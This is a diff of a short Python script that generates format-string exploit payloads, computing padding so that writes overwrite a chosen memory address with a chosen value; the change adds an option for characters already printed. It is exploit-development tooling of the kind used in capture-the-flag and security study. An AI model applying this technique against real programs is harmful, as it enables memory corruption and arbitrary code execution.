@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 # encoding: utf-8
 
-import sys
-import os
 import argparse
 
 def toHexFormat(string):
@@ -17,6 +15,7 @@ def main():
 	parser.add_argument('format_number', help='offset of formater')
 	parser.add_argument('addr_to_o', help='address to overwrite')
 	parser.add_argument('addr_to_w', help='address to write')
+	parser.add_argument('--aprint', help='number of chars already prints')
 	args = parser.parse_args()
 	
 	# add addr_to_o on the payload
@@ -29,7 +28,10 @@ def main():
 	addr_to_w = args.addr_to_w.decode("hex")[::-1]
 	
 	# add addr_to_w on the payload
-	total = 16 # 8 chars already print
+	total = 16
+	if args.aprint is not None:
+	    total += int(args.aprint)
+	    
 	for i in range(4):
 	    diff = 0
 	    while ((total + diff) & 0xff) != ord(addr_to_w[i]):
